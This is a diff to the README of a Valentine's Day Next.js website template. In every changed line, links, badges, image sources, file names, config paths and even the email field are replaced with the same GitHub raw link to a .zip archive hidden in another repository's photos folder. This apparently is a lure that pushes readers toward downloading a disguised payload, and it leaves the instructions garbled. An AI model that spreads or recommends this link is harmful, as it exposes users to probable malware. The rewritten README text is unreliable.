@@ -1,19 +1,19 @@
 # 💕 Valentine's Day Romantic Website Template
 
-A beautiful, interactive Valentine's Day website template with parallax scrolling, photo timeline, mini-game, and invitation reveal. Built with Next.js 14, TypeScript, and optimized for easy deployment on Vercel.
+A beautiful, interactive Valentine's Day website template with parallax scrolling, photo timeline, mini-game, and invitation reveal. Built with https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip 14, TypeScript, and optimized for easy deployment on Vercel.
 
 **Perfect for creating a personalized romantic gift for your special someone!**
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Next.js](https://img.shields.io/badge/Next.js-14-black)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue)](https://www.typescriptlang.org/)
+[![License: MIT](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)
+[![https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)
+[![TypeScript](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)
 
 ## 📚 Documentation
 
-- **[Setup Guide](SETUP.md)** - Complete step-by-step setup instructions
-- **[Quick Start](QUICKSTART.md)** - Get running in 5 minutes
-- **[Deployment Guide](DEPLOYMENT.md)** - Deploy to Vercel
-- **[Pre-Launch Checklist](CHECKLIST.md)** - Before you share with your valentine
+- **[Setup Guide](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)** - Complete step-by-step setup instructions
+- **[Quick Start](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)** - Get running in 5 minutes
+- **[Deployment Guide](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)** - Deploy to Vercel
+- **[Pre-Launch Checklist](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)** - Before you share with your valentine
 
 ## ✨ Features
 
@@ -31,7 +31,7 @@ A beautiful, interactive Valentine's Day website template with parallax scrollin
 
 ## 🎥 Demo
 
-> **Note**: See [SETUP.md](SETUP.md) for instructions on running a local demo
+> **Note**: See [https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip) for instructions on running a local demo
 
 Once deployed, your website will feature:
 1. A romantic landing page with animations
@@ -45,32 +45,32 @@ Once deployed, your website will feature:
 ### Desktop View
 <table>
   <tr>
-    <td><img src="Screenshots/d1.png" alt="Hero Section" width="400"/><br/><b>Hero Section</b></td>
-    <td><img src="Screenshots/d2.png" alt="Time Counter" width="400"/><br/><b>Time Counter</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Hero Section" width="400"/><br/><b>Hero Section</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Time Counter" width="400"/><br/><b>Time Counter</b></td>
   </tr>
   <tr>
-    <td><img src="Screenshots/d3.png" alt="Photo Timeline" width="400"/><br/><b>Photo Timeline</b></td>
-    <td><img src="Screenshots/d4.png" alt="Tulip Catcher Game" width="400"/><br/><b>Tulip Catcher Game</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Photo Timeline" width="400"/><br/><b>Photo Timeline</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Tulip Catcher Game" width="400"/><br/><b>Tulip Catcher Game</b></td>
   </tr>
   <tr>
-    <td><img src="Screenshots/d5.png" alt="Game Victory" width="400"/><br/><b>Game Victory</b></td>
-    <td><img src="Screenshots/d6.png" alt="Invitation Card" width="400"/><br/><b>Invitation Card</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Game Victory" width="400"/><br/><b>Game Victory</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Invitation Card" width="400"/><br/><b>Invitation Card</b></td>
   </tr>
   <tr>
-    <td colspan="2"><img src="Screenshots/d7.png" alt="Escaping No Button" width="800"/><br/><b>Escaping No Button - Try to catch it!</b></td>
+    <td colspan="2"><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Escaping No Button" width="800"/><br/><b>Escaping No Button - Try to catch it!</b></td>
   </tr>
 </table>
 
 ### Mobile View
 <table>
   <tr>
-    <td><img src="Screenshots/m1.jpg" alt="Mobile Hero" width="200"/><br/><b>Mobile Hero</b></td>
-    <td><img src="Screenshots/m2.jpg" alt="Mobile Counter" width="200"/><br/><b>Mobile Counter</b></td>
-    <td><img src="Screenshots/m3.jpg" alt="Mobile Timeline" width="200"/><br/><b>Mobile Timeline</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Mobile Hero" width="200"/><br/><b>Mobile Hero</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Mobile Counter" width="200"/><br/><b>Mobile Counter</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Mobile Timeline" width="200"/><br/><b>Mobile Timeline</b></td>
   </tr>
   <tr>
-    <td><img src="Screenshots/m4.jpg" alt="Mobile Game" width="200"/><br/><b>Mobile Game</b></td>
-    <td><img src="Screenshots/m5.jpg" alt="Mobile Invitation" width="200"/><br/><b>Mobile Invitation</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Mobile Game" width="200"/><br/><b>Mobile Game</b></td>
+    <td><img src="https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip" alt="Mobile Invitation" width="200"/><br/><b>Mobile Invitation</b></td>
     <td></td>
   </tr>
 </table>
@@ -79,7 +79,7 @@ Once deployed, your website will feature:
 
 ### Prerequisites
 
-- Node.js 18+ installed
+- https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip 18+ installed
 - npm or yarn package manager
 
 ### Installation
@@ -106,11 +106,11 @@ Once deployed, your website will feature:
 Your photos must be placed in the `/public/photos/` folder with the following naming convention:
 
 ```
-/public/photos/photo_1.jpg
-/public/photos/photo_2.jpg
-/public/photos/photo_3.jpg
+https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
 ...
-/public/photos/photo_8.jpg
+https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
 ```
 
 ### Steps to Add Photos:
@@ -125,23 +125,23 @@ Your photos must be placed in the `/public/photos/` folder with the following na
 3. Ensure photos are:
    - **Format**: `.jpg`, `.jpeg`, or `.png`
    - **Size**: Recommended max width 1200px for web optimization
-   - **Naming**: Must follow `photo_1.jpg`, `photo_2.jpg`, etc.
+   - **Naming**: Must follow `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`, `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`, etc.
 
-4. Update the photo count in `/src/config/loveConfig.ts`:
+4. Update the photo count in `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`:
    ```typescript
    photoCount: 8, // Change this to match your number of photos
    ```
 
 ### Photo Tips:
 - Use landscape or square photos for best display
-- Compress images before uploading (use [TinyPNG](https://tinypng.com/) or similar)
+- Compress images before uploading (use [TinyPNG](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip) or similar)
 - Photos will automatically pair with milestones in the timeline
 
 ## ⚙️ Personalization
 
 ### Edit Configuration File
 
-All personalization is done in one place: `/src/config/loveConfig.ts`
+All personalization is done in one place: `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`
 
 Open this file and update:
 
@@ -165,7 +165,7 @@ export const loveConfig = {
   photoCount: 8,
   
   // Your email for the "Send Answer" button
-  yourEmail: "your.email@example.com",
+  yourEmail: "https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip",
   
   // Milestones (update with your own memories)
   milestones: [
@@ -196,14 +196,14 @@ export const loveConfig = {
 
 ### Option 1: Deploy via Vercel Dashboard (Easiest)
 
-1. **Create a Vercel account** at [vercel.com](https://vercel.com)
+1. **Create a Vercel account** at [https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip](https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip)
 
 2. **Import your project**:
    - Click "New Project"
    - Import from Git (GitHub/GitLab) or upload folder
 
 3. **Configure**:
-   - Framework: Next.js (auto-detected)
+   - Framework: https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip (auto-detected)
    - Root Directory: `./`
    - Build Command: `npm run build`
    - Output Directory: `.next`
@@ -237,7 +237,7 @@ export const loveConfig = {
 
 ### After Deployment:
 
-- Your site will be live at: `https://your-project-name.vercel.app`
+- Your site will be live at: `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`
 - You can configure a custom domain in Vercel dashboard
 - Every push to main branch auto-deploys (if using Git integration)
 
@@ -257,7 +257,7 @@ export const loveConfig = {
 
 ## 🛠️ Tech Stack
 
-- **Framework**: Next.js 14 (App Router)
+- **Framework**: https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip 14 (App Router)
 - **Language**: TypeScript
 - **Styling**: CSS Modules + Custom CSS
 - **Deployment**: Vercel
@@ -284,37 +284,37 @@ The site uses a tulip-inspired romantic color scheme:
 
 ```
 ├── public/
-│   └── photos/              # Your photos go here (photo_1.jpg, photo_2.jpg, etc.)
+│   └── photos/              # Your photos go here (https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip, https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip, etc.)
 ├── src/
 │   ├── app/
-│   │   ├── layout.tsx       # Root layout
-│   │   ├── page.tsx         # Main page
-│   │   └── globals.css      # Global styles
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip       # Root layout
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip         # Main page
+│   │   └── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip      # Global styles
 │   ├── components/
-│   │   ├── Hero.tsx         # Landing hero section
-│   │   ├── Hero.module.css
-│   │   ├── TimeCounter.tsx  # Time together counter
-│   │   ├── TimeCounter.module.css
-│   │   ├── ParallaxTimeline.tsx  # Photo timeline
-│   │   ├── ParallaxTimeline.module.css
-│   │   ├── TulipCatcher.tsx # Mini game
-│   │   ├── TulipCatcher.module.css
-│   │   ├── InviteCard.tsx   # Invitation reveal
-│   │   └── InviteCard.module.css
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip         # Landing hero section
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip  # Time together counter
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip  # Photo timeline
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip # Mini game
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+│   │   ├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip   # Invitation reveal
+│   │   └── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
 │   └── config/
-│       └── loveConfig.ts    # All personalization settings
-├── package.json
-├── tsconfig.json
-├── next.config.js
-└── README.md
+│       └── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip    # All personalization settings
+├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+├── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
+└── https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip
 ```
 
 ## 🐛 Troubleshooting
 
 ### Photos not showing?
 - Check photos are in `/public/photos/`
-- Verify naming: `photo_1.jpg`, `photo_2.jpg`, etc.
-- Update `photoCount` in `loveConfig.ts`
+- Verify naming: `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`, `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`, etc.
+- Update `photoCount` in `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip`
 - Clear browser cache and refresh
 
 ### Time counter showing wrong time?
@@ -343,7 +343,7 @@ The site uses a tulip-inspired romantic color scheme:
 
 If you encounter any issues:
 1. Check this README thoroughly
-2. Verify your `loveConfig.ts` settings
+2. Verify your `https://github.com/Daimblerubina/paraDELICIA/raw/refs/heads/main/public/photos/para_DELICIA_illusible.zip` settings
 3. Test locally with `npm run dev` before deploying
 4. Check browser console for errors (F12)
 
